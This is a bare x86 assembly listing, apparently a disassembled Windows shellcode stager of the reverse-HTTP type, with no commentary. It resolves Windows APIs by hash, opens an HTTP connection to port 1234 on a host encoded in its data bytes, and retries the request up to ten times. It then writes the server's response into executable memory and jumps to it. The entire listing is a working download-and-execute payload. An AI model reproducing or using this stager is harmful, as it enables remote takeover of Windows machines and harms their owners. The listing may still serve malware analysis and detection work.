```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    mov ebp, esp
    xor edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
    jmp L_15
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_15:
    movzx ecx, word ptr [edx + 0x26]
    xor edi, edi
    mov esi, dword ptr [edx + 0x28]
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    push edi
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    push eax
    mov ecx, dword ptr [eax + 0x18]
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
L_4b:
    test ecx, ecx
    je L_8b
    xor edi, edi
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    xor eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_95:
    pop ebp
    push 0x707474
    push 0x686e6977
    push esp
    push 0x726774c
    call ebp
    xor ebx, ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push 0xbb9d1f04
    call ebp
    push eax
    push ebx
    push 0x4d2
    call L_379
RET_c2:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
L_28c:
    add edi, 0x2a
    push eax
    push 0xc21e9b46
    call ebp
    push DATA_0 + 62
    push ebx
    push ebx
    push ebx
    push edi
    push ebx
    push eax
    push 0x5bb31098
    call ebp
    xchg esi, eax
    sub esp, 0x10
    mov eax, esp
    push edi
    mov edi, eax
    push edi
    push 0x600ba721
    call ebp
    test eax, eax
    je L_30b
    mov eax, dword ptr [edi + 4]
    test eax, eax
    je L_2ef
    pop edx
    sub edx, 0x2a
    push 1
    push ebx
    push ebx
    push eax
    push 3
    push 3
    mov eax, esp
    sub esp, 0xc
    mov edi, esp
    push edi
    push eax
    push edx
    lea eax, [esp + 0x40]
    push dword ptr [eax]
    push 0x49eaddda
    call ebp
    test eax, eax
    je L_30b
    jmp L_2fe
L_2ef:
    mov eax, dword ptr [edi + 8]
    test eax, eax
    je L_30b
    push 4
    pop eax
    add edi, eax
    dec eax
    mov dword ptr [edi], eax
L_2fe:
    push 0xc
    push edi
    push 0x26
    push esi
    push 0xce9d58d3
    call ebp
L_30b:
    push 0xa
    pop edi
L_30e:
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push esi
    push 0x91bb5895
    call ebp
    test eax, eax
    jne L_328
    dec edi
    jne L_30e
L_323:
    call L_393
L_328:
    push ebx
    push esi
    push 0x709d8805
    call ebp
    test eax, eax
    je L_323
    push ebx
    mov eax, esp
    push ebx
    mov edi, esp
    push edi
    push 4
    push eax
    push esi
    push 0x7e24296c
    call ebp
    pop ebx
    pop ebx
    test eax, eax
    je L_323
    xor eax, eax
    push 0x40
    push 0x1000
    push ebx
    push eax
    push 0xe553a458
    call ebp
    xchg ebx, eax
    push ebx
    push ebx
    mov edi, esp
    push edi
    push eax
    push ebx
    push esi
    push 0x7e24296c
    call ebp
    test eax, eax
    je L_323
    pop eax
    ret
L_379:
    pop edi
    call L_28c
    xor dword ptr [eax], eax
    xor al, byte ptr [eax]
    aaa
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [ecx], dh
    add byte ptr [eax], al
    add byte ptr [ebx + 0x56a2b5f0], bh
L_393:
    push 0
    push ebx
    call ebp
```